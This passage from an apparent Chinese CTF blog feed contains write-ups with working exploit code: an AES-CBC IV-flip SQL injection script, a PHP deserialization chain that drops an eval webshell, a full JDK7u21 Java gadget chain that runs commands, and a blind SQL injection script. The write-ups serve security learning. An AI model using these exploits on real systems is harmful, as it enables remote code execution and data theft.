substr(base64_decode($encryptStr),16);        $decrypted = openssl_decrypt($encrypted, &#39;aes-128-cbc&#39;, $encryptKey, true, $iv);        echo openssl_error_string();        return $decrypted;    }}</code></pre><p>其中$iv是受到我们控制的</p><p><img src="https://image.3001.net/images/20180228/15198072135832.png!small" alt="image12048"></p><p>根据cbc加密的原理我们可以知道，通过修改iv从而修改初始的16个字符串</p><p>爆破合适iv的脚本:</p><pre><code class="php">&lt;?phpfunction strxor($str1,$str2){    $res=&quot;&quot;;    if(strlen($str1)!==strlen($str2))        return &quot;&quot;;    for($i=0;$i&lt;strlen($str1);$i++){        $res.=chr(ord($str1[$i])^ord($str2[$i]));    }    return $res;}$enc=urldecode(&quot;Y2JjaXNmdW5zb2lzYmFzZUDBRfKeIBJYWfSM2WOSqNOLdJ7UM1Nq%2B9zuKSrAr7O8%2B9AtpndZ00OlTIF0qmDsWw%3D%3D&quot;);$cipher = substr($enc,16,16);$message = substr(&#39;{&quot;username&quot;:&quot;fucker&quot;,&quot;contents&quot;:&quot;fucker&quot;}&#39;,0,16);$iv = &quot;cbcisfunsoisbase&quot;;$before_xor=strxor($message,$iv);for($i=0;$i&lt;256;$i++){    $iv = &quot;cbcisfunsoisbas&quot;.chr($i);    $result = strxor($iv,$before_xor);    if(strpos($result,&quot;&#39;&quot;)!==FALSE){        echo urlencode($iv);        echo &quot;\n&quot;.$result;    }}</code></pre><pre><code class="python">import requestsimport base64import urllibimport randomsession = requests.session()def reg(session,username):    burp0_url = &quot;http://100.100.1.5:80/ctf/register.php&quot;    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Origin&quot;: &quot;http://100.100.1.5&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://100.100.1.5/ctf/register.html&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}    burp0_data = {&quot;username&quot;: &quot;fuc&quot;+username, &quot;password&quot;: &quot;fucker&quot;, &quot;submit&quot;: &quot;\xe6\xb3\xa8\xe5\x86\x8c&quot;}    r=session.post(burp0_url, headers=burp0_headers, data=burp0_data)    if &quot;注册成功&quot; in r.text:        return True    else:        return Falsedef cache(session):    burp0_url = &quot;http://100.100.1.5:80/ctf/notes.php&quot;    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Origin&quot;: &quot;http://100.100.1.5&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://100.100.1.5/ctf/index.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}    burp0_data = {&quot;contents&quot;: &quot;fffffffffffffffffffffffffffffffffff&quot;, &quot;cache&quot;: &#39;&#39;}    r=session.post(burp0_url, headers=burp0_headers, data=burp0_data)    if &quot;缓存成功&quot; in r.text:        return True    return Falsedef submit(session,cookies):    burp0_url = &quot;http://100.100.1.5:80/ctf/notes.php&quot;    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Origin&quot;: &quot;http://100.100.1.5&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://100.100.1.5/ctf/index.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}    burp0_data = {&quot;contents&quot;: &quot;fffffffffffffffffffffffffffffffffff&quot;, &quot;submit&quot;: &#39;&#39;}    session.cookies = requests.utils.cookiejar_from_dict(cookies, cookiejar=None, overwrite=True)    r=session.post(burp0_url, headers=burp0_headers, data=burp0_data,cookies=cookies)    return rdef sqlinj(sql):    reg(session,sql)    cache(session)    cookie = session.cookies.get_dict()    cookie[&quot;cache&quot;]=urllib.parse.quote_plus(str(base64.b64encode(b&quot;cbcisfunsoisbas\x21&quot;+base64.b64decode(urllib.parse.unquote(cookie[&quot;cache&quot;]))[16:]),encoding=&quot;ascii&quot;))    print(cookie)    r=submit(session,cookie)    return rsql=&quot;or(updatexml(1,concat(0x7e,(select upload from users where username=0x61646D696E),0x7e),1))),0x666666666666,localtime())#dd&quot;r=sqlinj(sql)print(r.text)if &quot;提交成功&quot; not in r.text:    print(r.text)</code></pre><p>上传名为file的文件，得到config/admin/secretpath/profile</p><p>结合<code>include &quot;config/${_SESSION[&#39;token&#39;]}/profile&quot;;</code>从而getshell</p><p>token是base64编码，因此可以精心构造出admin/secretpath</p><p>由于没有题目环境便无法验证</p><h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>网络上找到了一个payload:<a href="http://igml.top/2020/08/21/2020-ciscn/" target="_blank" rel="noopener">http://igml.top/2020/08/21/2020-ciscn/</a></p><pre><code class="php">&lt;?phpnamespace DB\Jig {    class Mapper    {        protected $db;        protected $file = &#39;gmmml.php&#39;;        protected $document = &#39;&lt;?php @eval($_POST[gml]);?&gt;&#39;;        function __construct($db)        {            $this-&gt;db = $db;        }    }}namespace DB {    class Jig    {        protected $format = 0;        protected $dir = &#39;./&#39;;    }}namespace CLI {    class Agent    {        protected $server;        function __construct($server)        {            $this-&gt;server = $server;        }    }    class WS    {        protected $events;        function __construct($events)        {            $this-&gt;events = $events;        }    }}namespace {    class F3    {        public $events;        function __construct($events)        {            $this-&gt;events = $events;        }    }    $a = new DB\Jig();    $b = new DB\Jig\Mapper($a);    $c = new F3(array(&#39;disconnect&#39; =&gt; array($b, &quot;insert&quot;)));    $d = new CLI\Agent($c);    $e = new CLI\WS($d);    echo urlencode(serialize($e));}</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://www.ccreater.top/2020/10/04/2020">https://www.ccreater.top/2020/10/04/2020</a> ciscn 华东南 web/](<a href="https://www.ccreater.top/2020/10/04/2020">https://www.ccreater.top/2020/10/04/2020</a> ciscn 华东南 web/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jdk7u21反序列化复现</title>
      <link href="2020/10/04/jdk7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/10/04/jdk7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="JDK7u21反序列化链复现"><a href="#JDK7u21反序列化链复现" class="headerlink" title="JDK7u21反序列化链复现"></a>JDK7u21反序列化链复现</h1><p>exp:</p><pre><code class="java">public class jdk7u21 {    public static void main(String[] args) throws Exception {            TemplatesImpl calc = (TemplatesImpl) Gadgets.createTemplatesImpl(&quot;calc&quot;);//生成恶意的calc            calc.getOutputProperties();//调用getOutputProperties就可以执行calc    }}</code></pre><p>一步步调试发现在<code>AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</code>弹出calc<br><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201004163506.png" alt="image466"><br>第380行是触发命令执行的点</p><h2 id="newInstance"><a href="#newInstance" class="headerlink" title="newInstance"></a>newInstance</h2><pre><code class="java">public class instance {    static{        try {            Runtime.getRuntime().exec(&quot;calc.exe&quot;);        } catch (IOException e) {            e.printStackTrace();        }    }    public static void main(String args[]){        try {            instance.class.newInstance();        } catch (InstantiationException e) {            e.printStackTrace();        } catch (IllegalAccessException e) {            e.printStackTrace();        }    }}</code></pre><p>将恶意代码放在static或构造方法中便可以在初始化时执行恶意代码</p><h2 id="getTransletInstance"><a href="#getTransletInstance" class="headerlink" title="getTransletInstance"></a>getTransletInstance</h2><p>逐句执行观察到命令执行的限制条件与getOutputProperties和newTransformer没有太大关系<br>在getTransletInstance中发现一系列的限制</p><pre><code class="java">private Translet getTransletInstance()        throws TransformerConfigurationException {        try {            if (_name == null) return null;//TemplatesImpl._name!=null            if (_class == null) defineTransletClasses();//TemplatesImpl._class==null            // The translet needs to keep a reference to all its auxiliary            // class to prevent the GC from collecting them            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();//_transletIndex在defineTransletClasses中定义            translet.postInitialization();            translet.setTemplates(this);            translet.setServicesMechnism(_useServicesMechanism);            if (_auxClasses != null) {                translet.setAuxiliaryClasses(_auxClasses);            }            return translet;        }        catch (InstantiationException e) {            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);            throw new TransformerConfigurationException(err.toString());        }        catch (IllegalAccessException e) {            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);            throw new TransformerConfigurationException(err.toString());        }    }</code></pre><p>TemplatesImpl._name!=null和TemplatesImpl._class==null是执行到newInstance处的必要条件<br>而_transletIndex也是在defineTransletClasses中定义<br>跟进defineTransletClasses查找进一步的限制条件</p><h2 id="defineTransletClasses"><a href="#defineTransletClasses" class="headerlink" title="defineTransletClasses"></a>defineTransletClasses</h2><pre><code class="java">private void defineTransletClasses()        throws TransformerConfigurationException {        if (_bytecodes == null) {//_bytecodes!=null            ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);            throw new TransformerConfigurationException(err.toString());        }        TransletClassLoader loader = (TransletClassLoader)            AccessController.doPrivileged(new PrivilegedAction() {                public Object run() {                    return new TransletClassLoader(ObjectFactory.findClassLoader());                }            });        try {            final int classCount = _bytecodes.length;            _class = new Class[classCount];            if (classCount &gt; 1) {                _auxClasses = new Hashtable();            }            for (int i = 0; i &lt; classCount; i++) {                _class[i] = loader.defineClass(_bytecodes[i]);                final Class superClass = _class[i].getSuperclass();                // Check if this is the main class                if (superClass.getName().equals(ABSTRACT_TRANSLET)) {                    _transletIndex = i;                }//_class.superClass==com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet                else {                    _auxClasses.put(_class[i].getName(), _class[i]);                }            }            ...        }        ...    }</code></pre><p>阅读代码发现<code>_class[i] = loader.defineClass(_bytecodes[i]);</code>加载了我们的恶意类，但是它必须是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>的子类<br>_bytecodes!=null<br>综上我们可以得知要执行到恶意代码的触发点需要满足以下条件</p><pre><code>1. TemplatesImpl._name!=null2. TemplatesImpl._class==null3. _bytecodes!=null4. 恶意类是`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`的子类5. TemplatesImpl类中的_tfactory变量需要有一个getExternalExtensionsMap方法（其他版本的限制条件）</code></pre><p>关于第五点的相关代码是(与7u21略有不同)：</p><pre><code class="java">TransletClassLoader loader = (TransletClassLoader)            AccessController.doPrivileged(new PrivilegedAction() {                public Object run() {                    return new         //限制条件4：TemplatesImpl类中的_tfactory变量需要有一个getExternalExtensionsMap方法        //           即需要是一个TransformerFactoryImpl类   TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());                }            });</code></pre><h2 id="尝试自己写一个POC"><a href="#尝试自己写一个POC" class="headerlink" title="尝试自己写一个POC"></a>尝试自己写一个POC</h2><h3 id="Gadgets-createTemplatesImpl"><a href="#Gadgets-createTemplatesImpl" class="headerlink" title="Gadgets.createTemplatesImpl"></a>Gadgets.createTemplatesImpl</h3><p>跟进</p><pre><code class="java">public static TemplatesImpl createTemplatesImpl(final String command) throws Exception {        final TemplatesImpl templates = new TemplatesImpl();        // use template gadget class        ClassPool pool = ClassPool.getDefault();        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));        final CtClass clazz = pool.get(StubTransletPayload.class.getName());        // run command in static initializer        clazz.makeClassInitializer()                .insertAfter(&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;                        + command.replaceAll(&quot;\&quot;&quot;, &quot;\\\&quot;&quot;)                        + &quot;\&quot;);&quot;);        // unique name to allow repeated execution (watch out for PermGen exhaustion)        clazz.setName(&quot;ysoserial.Pwner&quot; + System.nanoTime());//Sets the class name        final byte[] classBytes = clazz.toBytecode();        // inject class bytes into instance        Reflections.setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] {                classBytes,                ClassFiles.classAsBytes(Foo.class)});//                  classBytes});        // required to make TemplatesImpl happy        Reflections.setFieldValue(templates, &quot;_name&quot;, &quot;Pwnr&quot;);//        Reflections.setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());        Reflections.setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());        return templates;    }</code></pre><p>其中clazz是我们的恶意类装在templates的_bytecodes中，templates满足了其他的限制条件<br>这里用了javassist来构造我们的恶意类</p><h3 id="javassist简介"><a href="#javassist简介" class="headerlink" title="javassist简介"></a>javassist简介</h3><p><a href="https://www.cnblogs.com/rickiyang/p/11336268.html" target="_blank" rel="noopener">https://www.cnblogs.com/rickiyang/p/11336268.html</a></p><pre><code class="java">    ClassPool pool = ClassPool.getDefault();    pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));    final CtClass clazz = pool.get(StubTransletPayload.class.getName());    clazz.makeClassInitializer()//Makes an empty class initializer (static constructor).                    .insertAfter(&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;                            + command.replaceAll(&quot;\&quot;&quot;, &quot;\\\&quot;&quot;)                            + &quot;\&quot;);&quot;);//在方法后面添加代码    clazz.setName(&quot;ysoserial.Pwner&quot; + System.nanoTime());</code></pre><h3 id="自己实现"><a href="#自己实现" class="headerlink" title="自己实现"></a>自己实现</h3><pre><code class="java">public class myjdk7u21 {    public static class evil extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet implements Serializable{        @Override        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {        }        @Override        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {        }    }    public static void main(String args[]) throws NotFoundException, CannotCompileException, NoSuchFieldException, IllegalAccessException, IOException {        ClassPool pool = ClassPool.getDefault();        pool.insertClassPath(new ClassClassPath(evil.class));        CtClass evilobj = pool.get(evil.class.getName());        evilobj.makeClassInitializer().insertAfter(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);        evilobj.setName(&quot;ccreater233&quot;+System.nanoTime());        final TemplatesImpl tpl = new TemplatesImpl();        setField(TemplatesImpl.class,tpl,&quot;_name&quot;,&quot;ccreater&quot;);        setField(TemplatesImpl.class,tpl,&quot;_class&quot;,null);        setField(TemplatesImpl.class,tpl,&quot;_bytecodes&quot;,new byte[][]{evilobj.toBytecode()});        tpl.getOutputProperties();    }    public static void setField(Class clazz,Object obj,String key,Object value) throws NoSuchFieldException, IllegalAccessException {        Field field = clazz.getDeclaredField(key);        field.setAccessible(true);        field.set(obj,value);    }}</code></pre><p>遇到的坑：evil记得声明为public，不然默认是private,就无法newInstance了</p><h2 id="动态代理AnnotationInvocationHandler"><a href="#动态代理AnnotationInvocationHandler" class="headerlink" title="动态代理AnnotationInvocationHandler"></a>动态代理AnnotationInvocationHandler</h2><p>利用动态代理来接近反序列化后直接RCE的目的</p><pre><code class="java">        final Constructor&lt;?&gt; ctor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructors()[0];        ctor.setAccessible(true);        InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Templates.class,new HashMap());        TempInt proxy = (TempInt)Proxy.newProxyInstance(TempInt.class.getClassLoader(),new Class[]{TempInt.class},invocationHandler);        proxy.equals(tpl);</code></pre><p>我们看下AnnotationInvocationHandler的构造方法</p><pre><code class="java">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) {        this.type = var1;        this.memberValues = var2;    }</code></pre><p>type和memberValues皆可控</p><p>debug跟进<br>proxy.equals 调用了动态代理AnnotationInvocationHandler的invoke方法</p><pre><code class="java">    public Object invoke(Object var1, Method var2, Object[] var3) {            String var4 = var2.getName();            Class[] var5 = var2.getParameterTypes();            if (var4.equals(&quot;equals&quot;) &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) {                return this.equalsImpl(var3[0]);            }            ...    }</code></pre><p>方法名为equals且只有一个参数，这进入<code>this.equalsImpl(var3[0]);</code></p><p>equalsImpl</p><pre><code class="java">private Boolean equalsImpl(Object var1) {        if (var1 == this) {            return true;        } else if (!this.type.isInstance(var1)) {            return false;        } else {            Method[] var2 = this.getMemberMethods();            int var3 = var2.length;            for(int var4 = 0; var4 &lt; var3; ++var4) {                Method var5 = var2[var4];                String var6 = var5.getName();                Object var7 = this.memberValues.get(var6);                Object var8 = null;                AnnotationInvocationHandler var9 = this.asOneOfUs(var1);                if (var9 != null) {                    var8 = var9.memberValues.get(var6);                } else {                    try {                        var8 = var5.invoke(var1);                    } catch (InvocationTargetException var11) {                        return false;                    } catch (IllegalAccessException var12) {                        throw new AssertionError(var12);                    }                }...            }        }    }</code></pre><p>在这个方法中调用了<code>var8 = var5.invoke(var1);</code>,相当于var1.var5(),其中var1是a.equals(b)中的b<br>var5是this.type的第一个方法(this.getMemberMethods()[0])<br>跟进getMemberMethods</p><pre><code class="java">private Method[] getMemberMethods() {        if (this.memberMethods == null) {            this.memberMethods = (Method[])AccessController.doPrivileged(new PrivilegedAction&lt;Method[]&gt;() {                public Method[] run() {                    Method[] var1 = AnnotationInvocationHandler.this.type.getDeclaredMethods();                    AccessibleObject.setAccessible(var1, true);                    return var1;                }            });        }        return this.memberMethods;    }</code></pre><p>也就是说我们可以通过控制this.type从而调用xx.equals(evilObj),来达到evilObj.AnyMethod()的效果<br>这也恰好符合了我们想调用evilObj.getOutputProperties()情况<br>最后选择了Templates,它的第一个方法是newTransformer,漏洞点在newTransformer中触发</p><h2 id="LinkedHashSet反序列化调用equals"><a href="#LinkedHashSet反序列化调用equals" class="headerlink" title="LinkedHashSet反序列化调用equals"></a>LinkedHashSet反序列化调用equals</h2><p>问我为啥知道这里可以，答：别人发现的<br>LinkedHashSet没有实现readObject方法而是调用了HashSet的readObject方法，既然如此，为啥不直接调用HashSet嘞<br>等下就知道了<br>HashSet::readObject</p><pre><code class="java">private void readObject(java.io.ObjectInputStream s)        throws java.io.IOException, ClassNotFoundException {        // Read in any hidden serialization magic        s.defaultReadObject();        // Read in HashMap capacity and load factor and create backing HashMap        int capacity = s.readInt();        float loadFactor = s.readFloat();        map = (((HashSet)this) instanceof LinkedHashSet ?               new LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :               new HashMap&lt;E,Object&gt;(capacity, loadFactor));        // Read in size        int size = s.readInt();        // Read in all elements in the proper order.        for (int i=0; i&lt;size; i++) {            E e = (E) s.readObject();            map.put(e, PRESENT);        }    }</code></pre><p>跟进HashMap::put方法</p><pre><code class="java">public V put(K key, V value) {        if (key == null)            return putForNullKey(value);        int hash = hash(key);        int i = indexFor(hash, table.length);        for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) {            Object k;            if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) {                V oldValue = e.value;                e.value = value;                e.recordAccess(this);                return oldValue;            }        }        modCount++;        addEntry(hash, key, value, i);        return null;    }</code></pre><p>我们看到key.equals(k)完美的符合了我们的预期<br>这里得是顺序调用才能常出现proxy.equals(evilObj),所以用了LinkedHashSet<br>但是在这之前我们要满足两个条件</p><ol><li>e.hash == hash即hash(proxy) == hash(evilObj)</li><li>e.key!=key即proxy!=evilObj<br>第二个条件很容易满足，第一个条件就GG了<br>跟进int hash = hash(key);中的hash方法看一下发现</li></ol><pre><code class="java">final int hash(Object k) {        int h = 0;        if (useAltHashing) {            if (k instanceof String) {                return sun.misc.Hashing.stringHash32((String) k);            }            h = hashSeed;        }        h ^= k.hashCode();        // This function ensures that hashCodes that differ only by        // constant multiples at each bit position have a bounded        // number of collisions (approximately 8 at default load factor).        h ^= (h &gt;&gt;&gt; 20) ^ (h &gt;&gt;&gt; 12);        return h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4);    }</code></pre><p>调用了key的hashCode方法，即进入了AnnotationInvocationHandler的invoke方法<br>见证奇迹的时刻：<br>在invoke中有这样的一句话：</p><pre><code>if (var4.equals(&quot;hashCode&quot;)) {    return this.hashCodeImpl();</code></pre><p>跟进hashCodeImpl</p><pre><code class="java">    private int hashCodeImpl() {        int var1 = 0;        Entry var3;        for(Iterator var2 = this.memberValues.entrySet().iterator(); var2.hasNext(); var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) {            var3 = (Entry)var2.next();        }        return var1;    }</code></pre><p>我们关注<code>var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())</code><br>这相当于<code>127*key.hashcode()^Arrays.hashCode((Object[])((Object[])value))</code><br>因为0^x=x,且<em>优先级大于^,所以令key.hashcode()=0使得e.hash == hash最终变成<br>127</em>key.hashcode()^Arrays.hashCode((Object[])((Object[])value))=0^value.hashcode()==value.hashcode()<br>所以构造</p><pre><code class="java">package org.example;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import javassist.*;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.*;import java.util.HashMap;import java.util.HashSet;import java.util.LinkedHashSet;import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;public class myjdk7u21 {    public static class evil extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet implements Serializable{        @Override        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {        }        @Override        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {        }    }    public static void main(String args[]) throws Exception {        ClassPool pool = ClassPool.getDefault();        pool.insertClassPath(new ClassClassPath(evil.class));        CtClass evilobj = pool.get(evil.class.getName());        evilobj.makeClassInitializer().insertAfter(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);        evilobj.setName(&quot;ccreater233&quot;+System.nanoTime());        final TemplatesImpl tpl = new TemplatesImpl();        setField(TemplatesImpl.class,tpl,&quot;_name&quot;,&quot;ccreater&quot;);        setField(TemplatesImpl.class,tpl,&quot;_class&quot;,null);        setField(TemplatesImpl.class,tpl,&quot;_bytecodes&quot;,new byte[][]{evilobj.toBytecode()});        //evil instance        //tpl.getOutputProperties();        final Constructor&lt;?&gt; ctor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructors()[0];        ctor.setAccessible(true);        HashMap map = new HashMap();        map.put(&quot;f5a5a608&quot;,&quot;23333&quot;);        InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Templates.class,map);        TempInt proxy = (TempInt)Proxy.newProxyInstance(TempInt.class.getClassLoader(),new Class[]{TempInt.class},invocationHandler);        HashSet a = new LinkedHashSet();        a.add(tpl);        a.add(proxy);        map.put(&quot;f5a5a608&quot;,tpl);        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        //序列化        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);        objectOutputStream.writeObject(a);//序列化对象        objectOutputStream.flush();        objectOutputStream.close();        //反序列化        byte[] bytes = byteArrayOutputStream.toByteArray(); //读取序列化后的对象byte数组        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);//存放byte数组的输入流        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);        Object o = objectInputStream.readObject();    }    public static void setField(Class clazz,Object obj,String key,Object value) throws NoSuchFieldException, IllegalAccessException {        Field field = clazz.getDeclaredField(key);        field.setAccessible(true);        field.set(obj,value);    }}</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/10/04/jdk7u21反序列化复现/">https://www.ccreater.top/2020/10/04/jdk7u21反序列化复现/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-QWB-final-bjyadmin</title>
      <link href="2020/09/21/2020-QWB-final-bjyadmin/"/>
      <url>2020/09/21/2020-QWB-final-bjyadmin/</url>
      
        <content type="html"><![CDATA[<h1 id="2020-QWB-final-bjyadmin"><a href="#2020-QWB-final-bjyadmin" class="headerlink" title="2020-QWB-final-bjyadmin"></a>2020-QWB-final-bjyadmin</h1><h2 id="第一步sql注入"><a href="#第一步sql注入" class="headerlink" title="第一步sql注入"></a>第一步sql注入</h2><blockquote><p>选手使用攻击机利用靶机中的sql注入漏洞获取bjyadmin框架路径</p></blockquote><pre><code># mysql&gt; select info from PROCESSLIST;# +------------------------------+# | info                         |# +------------------------------+# | select info from PROCESSLIST |# +------------------------------+# 1 row in set (0.00 sec)</code></pre><p>利用processlist注出字段名，<a href="https://dev.mysql.com/doc/refman/8.0/en/performance-schema-processlist-table.html" target="_blank" rel="noopener">相关的介绍</a></p><pre><code class="python">import requestsimport timeip=&quot;192.168.10.110&quot;#http://101.133.129.243/def inj(pos,guess):    # true: real-guess &lt; 0    # false : guess &lt;= real    burp0_url = &quot;http://&quot;+ip+&quot;/?id=1&#39;/(if(floor((SELECT(ord(right(left(group_concat(info),{POS}),1)))FROM(information_schema.PROCESSLIST))/{GUESS}),1,0))/&#39;1&quot;.format(POS=pos,GUESS=guess)    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}    r=requests.get(burp0_url, headers=burp0_headers,proxies={&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;})    if &quot;Undefined variable: rows in&quot; in r.text:        return True    return False# &quot;http://101.133.129.243:80/?id=1&#39;/(if(floor((SELECT(ord(right(left(group_concat(schema_name),{POS}),1)))FROM(information_schema.schemata))/{GUESS}),1,0))/&#39;1&quot;# database:2020qwbctf # table_name:result=&quot;&quot;pos=len(result)+1while True:    min=32    max=128    print(result)    while True:        #time.sleep(1)        avr = int((min+max)/2)        print(avr)        if not inj(pos,avr):            if inj(pos,avr+1):                result+=chr(avr)                break            else:                min=avr        else:            max=avr        if max-min == 1:            if not inj(pos,min):                result+=chr(max)            else:                result+=chr(min)            break    pos+=1</code></pre><h2 id="bjyadmin"><a href="#bjyadmin" class="headerlink" title="bjyadmin"></a>bjyadmin</h2><p>题目提供的附件和</p><p><a href="https://github.com/baijunyao/thinkphp-bjyadmin" target="_blank" rel="noopener">https://github.com/baijunyao/thinkphp-bjyadmin</a></p><p>一摸一样</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200921120236.png" alt="image2362"></p><p>挨个看过去发现有一个容易令人忽略的漏洞（sxgg一眼看出来）</p><pre><code class="php">&lt;?phpnamespace Home\Controller;use Common\Controller\HomeBaseController;/** * Vue示例 */class VueController extends HomeBaseController{    /**     * 拦截空方法 自动加载html     * @param  string $methed_name 空方法   